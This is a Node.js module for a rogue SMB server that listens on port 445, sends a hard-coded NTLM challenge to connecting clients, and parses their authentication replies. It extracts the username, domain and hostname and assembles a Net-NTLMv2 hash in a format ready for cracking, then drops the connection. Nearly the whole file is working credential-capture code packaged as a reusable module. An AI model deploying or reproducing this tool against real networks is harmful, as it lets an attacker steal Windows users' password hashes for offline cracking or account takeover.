const net = require('net');

const getCurrentTimeStamp = () => {
    const a = (BigInt(Date.now() - (new Date('1601-01-01')).getTime()) * 10000n).toString(16).padStart(16, '0');

    return a.match(/.{2}/g).reverse().join('');
}

const createNegotiateResponse = (dialectList) => {
    const part1 = 'fe534d4240000000000000000000010001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041000000';
    const chosenDialect = '02' + (dialectList.length).toString(16).padStart(2, '0');
    const part2 = '00004141414141414141414141414141414100000000000001000000010000000100';
    const timeStamp = getCurrentTimeStamp();
    const part3 = '80001e0000000000601c06062b0601050502a0123010a00e300c060a2b06010401823702020a';

    const smb2_part = part1 + chosenDialect + part2 + timeStamp + timeStamp + part3;

    const netBiosSS = '00' + (smb2_part.length / 2).toString(16).padStart(6, '0');

    return netBiosSS + smb2_part;
}

const decodeNegotiateRequest = (rawMessageData) => {
    // Convert from Uint8Array to standard Array
    rawMessageData = Array.from(rawMessageData);

    // NetBIOS Session Service (4 Bytes)
    // Message Type = 1 Bytes
    // Length = 3 Bytes
    let NBSSMessageType = rawMessageData.shift();
    let NBSSLength = (rawMessageData.shift() << 16) | (rawMessageData.shift() << 8) | (rawMessageData.shift());

    // SMB Header Part 1 (4 Bytes)
    // \xffSMB
    let protocol = [
        rawMessageData.shift(),
        String.fromCharCode(rawMessageData.shift()),
        String.fromCharCode(rawMessageData.shift()),
        String.fromCharCode(rawMessageData.shift())
    ];

    // COMMAND Field (1 Byte)
    let commandField = rawMessageData.shift();

    // STATUS Field (4 Bytes)
    let statusField = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift()
    ];

    // FLAGS Field (1 Byte) TODO: Decode these further
    let flagsField = rawMessageData.shift();

    // FLAGS2 Field (2 Bytes)  TODO: Decode these further
    let flags2Field = (rawMessageData.shift() << 8) | rawMessageData.shift();

    // PidHigh Field (2 Bytes)
    let PidHighField = (rawMessageData.shift() << 8) | rawMessageData.shift();

    // Signature Field (8 Bytes)
    let signatureField = 0;
    for (let i = 0; i < 8; ++i) {
        signatureField = (signatureField << 8) | rawMessageData.shift();
    }

    // Reserved Field (2 Bytes)
    let ReservedField = (rawMessageData.shift() << 8) | rawMessageData.shift();

    // Tree Field (2 Bytes)
    let TreeField = (rawMessageData.shift() << 8) | rawMessageData.shift();

    // Process Field (2 Bytes)
    let ProcessField = (rawMessageData.shift() << 8) | rawMessageData.shift();

    // User Field (2 Bytes)
    let UserField = (rawMessageData.shift() << 8) | rawMessageData.shift();

    // Multiplex Field (2 Bytes)
    let MultiplexField = (rawMessageData.shift() << 8) | rawMessageData.shift();

    // Word Count (1 Byte)
    let WordCount = rawMessageData.shift();

    // Byte Count (2 Bytes)
    let ByteCount = (rawMessageData.shift() << 8) | rawMessageData.shift();

    let dialectList = [];
    let currentDialect = [];
    let currentByte = rawMessageData.shift();

    // Decoded the list of dialects from the SMB_DATA section.
    while (rawMessageData.length > 0) {
        if (currentByte === 0) {
            dialectList.push(currentDialect.join(''));
            currentDialect = [];
        } else if (currentByte != 2) {
            currentDialect.push(String.fromCharCode(currentByte));
        }

        currentByte = rawMessageData.shift();
    }

    // Add the last dialect to the list
    if (currentDialect.length > 0) dialectList.push(currentDialect.join(''));

    // Remove empty strings
    dialectList = dialectList.filter(x => x);

    return dialectList;
}


const decodeResponseToken = (rawMessageData) => {
    // NTLMSSP_Identifier Field (8 Bytes)
    let NTLMSSP_Identifier = [
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(),
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift()
    ].map(x => x.toString(16).padStart(2, '0')).join('');

    // NTLMSSP_Message_Type Field (4 Bytes)
    let NTLMSSP_Message_Type = [
        rawMessageData.shift(), rawMessageData.shift(),
        rawMessageData.shift(), rawMessageData.shift()
    ].map(x => x.toString(16).padStart(2, '0')).join('');


    let LM_Response = {
        Length: rawMessageData.shift() | (rawMessageData.shift() << 8),
        MaxLength: rawMessageData.shift() | (rawMessageData.shift() << 8),
        Offset: rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24),
    };

    let NTLM_Response = {
        Length: rawMessageData.shift() | (rawMessageData.shift() << 8),
        MaxLength: rawMessageData.shift() | (rawMessageData.shift() << 8),
        Offset: rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24),
    };

    let Domain_Name = {
        Length: rawMessageData.shift() | (rawMessageData.shift() << 8),
        MaxLength: rawMessageData.shift() | (rawMessageData.shift() << 8),
        Offset: rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24),
    };

    let User_Name = {
        Length: rawMessageData.shift() | (rawMessageData.shift() << 8),
        MaxLength: rawMessageData.shift() | (rawMessageData.shift() << 8),
        Offset: rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24),
    };

    let Host_Name = {
        Length: rawMessageData.shift() | (rawMessageData.shift() << 8),
        MaxLength: rawMessageData.shift() | (rawMessageData.shift() << 8),
        Offset: rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24),
    };

    let Session_Key = {
        Length: rawMessageData.shift() | (rawMessageData.shift() << 8),
        MaxLength: rawMessageData.shift() | (rawMessageData.shift() << 8),
        Offset: rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24),
    };


    // Negotiate_Flags Field (4 Bytes)
    let Negotiate_Flags = [
        rawMessageData.shift(), rawMessageData.shift(),
        rawMessageData.shift(), rawMessageData.shift()
    ].map(x => x.toString(16).padStart(2, '0')).join('');

    // Version Field (8 Bytes)
    let Version = [
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(),
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift()
    ].map(x => x.toString(16).padStart(2, '0')).join('');

    // MIC Field (16 Bytes)
    let MIC = [
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(),
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(),
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(),
        rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift(), rawMessageData.shift()
    ].map(x => x.toString(16).padStart(2, '0')).join('');


    Domain_Name.Name = Array.from(Array(Domain_Name.Length)).map(_ => String.fromCharCode(rawMessageData.shift())).filter(x => x !== '\x00').join('');
    User_Name.Name = Array.from(Array(User_Name.Length)).map(_ => String.fromCharCode(rawMessageData.shift())).filter(x => x !== '\x00').join('');
    Host_Name.Name = Array.from(Array(Host_Name.Length)).map(_ => String.fromCharCode(rawMessageData.shift())).filter(x => x !== '\x00').join('');
    LM_Response.Challenge = Array.from(Array(LM_Response.Length)).map(_ => rawMessageData.shift()).map(x => x.toString(16).padStart(2, '0')).join('');
    NTLM_Response.Challenge = Array.from(Array(NTLM_Response.Length)).map(_ => rawMessageData.shift()).map(x => x.toString(16).padStart(2, '0')).join('');

    return {
        username: User_Name.Name.toString('utf-8'),
        hostname: Host_Name.Name.toString(),
        domain: Domain_Name.Name.toString(),
        net_ntlm_v2_hash: `${User_Name.Name}::${Domain_Name.Name}:${'4141414141414141'}:${NTLM_Response.Challenge.slice(0, 32)}:${NTLM_Response.Challenge.slice(32)}`
    }
}

const decodeSessionSetupNTLMSSP_AUTH_Request = (rawMessageData) => {
    // Convert from Uint8Array to standard Array
    rawMessageData = Array.from(rawMessageData);

    // NetBIOS Session Service (4 Bytes)
    // Message Type = 1 Bytes
    // Length = 3 Bytes
    let NBSSMessageType = rawMessageData.shift();
    let NBSSLength = (rawMessageData.shift() << 16) | (rawMessageData.shift() << 8) | (rawMessageData.shift());

    // SMB Header Part 1 (4 Bytes)
    // \xffSMB
    let protocol = [
        rawMessageData.shift(),
        String.fromCharCode(rawMessageData.shift()),
        String.fromCharCode(rawMessageData.shift()),
        String.fromCharCode(rawMessageData.shift())
    ];

    // HeaderLength Field (2 Bytes)
    let HeaderLength = rawMessageData.shift() | (rawMessageData.shift() << 8)

    // CreditCharge Field (2 Bytes)
    let CreditCharge = rawMessageData.shift() | (rawMessageData.shift() << 8)

    // ChannelSequence Field (2 Bytes)
    let ChannelSequence = rawMessageData.shift() | (rawMessageData.shift() << 8)

    // Reserved Field (2 Bytes)
    let Reserved = rawMessageData.shift() | (rawMessageData.shift() << 8)

    // Command Field (2 Bytes)
    let Command = rawMessageData.shift() | (rawMessageData.shift() << 8)

    // CreditsRequested Field (2 Bytes)
    let CreditsRequested = rawMessageData.shift() | (rawMessageData.shift() << 8)

    // Flags Field (4 Bytes)
    let Flags = rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24)

    // ChainOffset Field (4 Bytes)
    let ChainOffset = rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24)

    // MessageID Field (8 Bytes)
    let MessageID = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
    ].reverse().map(x => x.toString(16).padStart(2, '0')).join('');

    // ProcessId Field (4 Bytes)
    let ProcessId = rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24)

    // TreeId Field (4 Bytes)
    let TreeId = rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24)

    // SessionId Field (8 Bytes)
    let SessionId = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
    ].reverse().map(x => x.toString(16).padStart(2, '0')).join('');

    // Signature Field (16 Bytes)
    let Signature = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
    ].reverse().map(x => x.toString(16).padStart(2, '0')).join('');

    // StructureSize Field (2 Bytes)
    let StructureSize = rawMessageData.shift() | (rawMessageData.shift() << 8);

    // Flags2 Field (1 Byte)
    let Flags2 = rawMessageData.shift()

    // SecurityMode Field (1 Byte)
    let SecurityMode = rawMessageData.shift()

    // Capabilities Field (4 Bytes)
    let Capabilities = rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24)

    // Channel Field (4 Bytes)
    let Channel = rawMessageData.shift() | (rawMessageData.shift() << 8) | (rawMessageData.shift() << 16) | (rawMessageData.shift() << 24)

    // BlogOffset Field (2 Bytes)
    let BlogOffset = rawMessageData.shift() | (rawMessageData.shift() << 8);

    // BlogLength Field (2 Bytes)
    let BlogLength = rawMessageData.shift() | (rawMessageData.shift() << 8);


    // PreviousSessionId Field (8 Bytes)
    let PreviousSessionId = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
    ].reverse().map(x => x.toString(16).padStart(2, '0')).join('');


    // SimpleProtectedNegotiation Field (8 Bytes)
    let SimpleProtectedNegotiation = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
    ].map(x => x.toString(16).padStart(2, '0')).join('');


    // NegTokenTarg Field (8 Bytes)
    let NegTokenTarg = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
    ].map(x => x.toString(16).padStart(2, '0')).join('');

    // NegResult Field (1 Byte)
    let NegResult = rawMessageData.shift()

    // notSure1 Field (8 Bytes)
    let notSure1 = [
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
        rawMessageData.shift(),
    ].map(x => x.toString(16).padStart(2, '0')).join('');

    return decodeResponseToken(rawMessageData);
}


let SERVER_SOCKET = null;
let CALLBACK_ON_ERROR = null;
let CALLBACK_ON_REQUEST = null;
let CALLBACK_ON_START = null;
let CALLBACK_ON_STOP = null;

class SmbServer {
    on(onType, callback) {
        if (!callback || typeof (callback) !== 'function') throw new Error('Callback Must be a function');

        if (onType === 'error') {
            CALLBACK_ON_ERROR = callback;
        } else if (onType === 'request') {
            CALLBACK_ON_REQUEST = callback;
        } else if (onType === 'start') {
            CALLBACK_ON_START = callback;
        } else if (onType === 'stop') {
            CALLBACK_ON_STOP = callback;
        } else return;
    }

    start() {
        try {
            SERVER_SOCKET = net.createServer((socket) => {
                let currentMessage = 0;

                socket.on('data', (data) => {
                    if (currentMessage === 0) {
                        let dialects = decodeNegotiateRequest(Uint8Array.from(data));
                        let res = createNegotiateResponse(dialects);

                        socket.write(Buffer.from(res, 'hex'));
                        currentMessage++;
                    } else if (currentMessage === 1) {
                        socket.write(Buffer.from('0000010ffe534d4240000100160000c00100210001000000000000000100000000000000fffe000000000000e737204a0000000000000000000000000000000000000000090000004800c700a181c43081c1a0030a0101a10c060a2b06010401823702020aa281ab0481a84e544c4d5353500002000000100010003800000007028ae2414141414141414100000000000000006000600048000000ffffffffffffffff52005700450056004400780055004a0001001000770043005300730056006a006800610003001000770043005300730056006a00680061000200100052005700450056004400780055004a000400100052005700450056004400780055004a000700080080961f7568e6d60100000000', 'hex'));
                        currentMessage++;
                    } else if (currentMessage === 2) {
                        let decodedDetails = decodeSessionSetupNTLMSSP_AUTH_Request(Uint8Array.from(data))
                        socket.destroy();
                        
                        if (CALLBACK_ON_REQUEST && typeof (CALLBACK_ON_REQUEST) === 'function') {
                            CALLBACK_ON_REQUEST(decodedDetails);
                        }
                    }
                });

                socket.on('error', (error) => {});
                socket.on('close', (data) => {});
            });

            SERVER_SOCKET.listen(445, '0.0.0.0', () => {
                if (CALLBACK_ON_START && typeof (CALLBACK_ON_START) === 'function') {
                    CALLBACK_ON_START();
                }
            });

            SERVER_SOCKET.on('error', (err) => {
                if (CALLBACK_ON_ERROR && typeof (CALLBACK_ON_ERROR) === 'function') {
                    CALLBACK_ON_ERROR(err);
                }
            });
        } catch (err) {
            if (CALLBACK_ON_ERROR && typeof (CALLBACK_ON_ERROR) === 'function') {
                CALLBACK_ON_ERROR(err);
            }
        }
    }

    stop() {
        try {
            SERVER_SOCKET.close(() => {
                if (CALLBACK_ON_STOP && typeof (CALLBACK_ON_STOP) === 'function') {
                    CALLBACK_ON_STOP();
                }
            });
            SERVER_SOCKET = null;
        } catch (err) {
            if (CALLBACK_ON_ERROR && typeof (CALLBACK_ON_ERROR) === 'function') {
                CALLBACK_ON_ERROR(err);
            }
        }
    }
}

module.exports = SmbServer;